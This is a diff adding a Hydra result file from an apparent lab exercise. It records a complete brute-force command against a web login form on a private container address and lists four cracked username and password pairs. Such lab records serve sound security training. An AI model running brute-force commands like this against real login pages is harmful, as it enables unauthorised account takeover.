@@ -1,0 +1,5 @@
+# Hydra v9.2 run at 2023-09-14 01:06:25 on 172.17.0.2 http-get-form (hydra -L users.txt -P Top207-probable-v2.txt -I -V -o hydra_result.txt 172.17.0.2 http-get-form /vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=dqdbjhbf0jjptin59qss9tkfd7; security=low)
+[80][http-get-form] host: 172.17.0.2   login: admin   password: password
+[80][http-get-form] host: 172.17.0.2   login: gordonb   password: abc123
+[80][http-get-form] host: 172.17.0.2   login: pablo   password: letmein
+[80][http-get-form] host: 172.17.0.2   login: smithy   password: password
